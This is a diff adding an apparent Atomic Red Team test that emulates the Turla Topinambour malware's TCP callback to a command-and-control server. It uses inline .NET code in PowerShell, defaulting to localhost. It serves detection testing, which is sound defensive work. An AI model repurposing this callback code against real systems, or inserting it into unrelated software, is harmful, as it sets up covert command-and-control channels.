@@ -117,3 +117,49 @@ atomic_tests:
 
           rm -rf /tmp/icmpdoor
     name: manual
+- name: Turla Topinambour TCP Callback via Inline .NET
+  auto_generated_guid: b2858526-001a-4b94-8036-d18dab2898a6
+  description: |
+    Attempts a TCP socket connection to a specified IP on port 13277 with a .NET payload, mirroring how Topinambour connects to hardcoded C2 addresses to establish a remote shell.
+    Defaults to 127.0.0.1 so the attempt fails safely without a listener. The socket has a 5 second connection
+    timeout via Poll, and a 20 second receive timeout.
+
+    Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+  supported_platforms:
+  - windows
+  input_arguments:
+    callback_ip:
+      description: IP address to connect back to (simulates C2 server)
+      type: string
+      default: "127.0.0.1"
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $callbackIP = "#{callback_ip}"
+      Add-Type @"
+      using System;
+      using System.Net;
+      using System.Net.Sockets;
+
+      public class TopinambourCallback {
+          public static void Connect(string ip) {
+              IPAddress addr = IPAddress.Parse(ip);
+              IPEndPoint remoteEP = new IPEndPoint(addr, 13277);
+              Socket socket = new Socket(addr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+              socket.ReceiveTimeout = 20000;
+              socket.SendTimeout = 60000;
+              socket.Blocking = false;
+              try { socket.Connect(remoteEP); } catch (SocketException) { }
+              if (!socket.Poll(5000000, SelectMode.SelectWrite)) {
+                  socket.Close();
+                  return;
+              }
+              socket.Blocking = true;
+              byte[] array = new byte[4];
+              socket.Receive(array, 4, SocketFlags.None);
+              socket.Close();
+          }
+      }
+      "@
+      try { [TopinambourCallback]::Connect($callbackIP) } catch { }
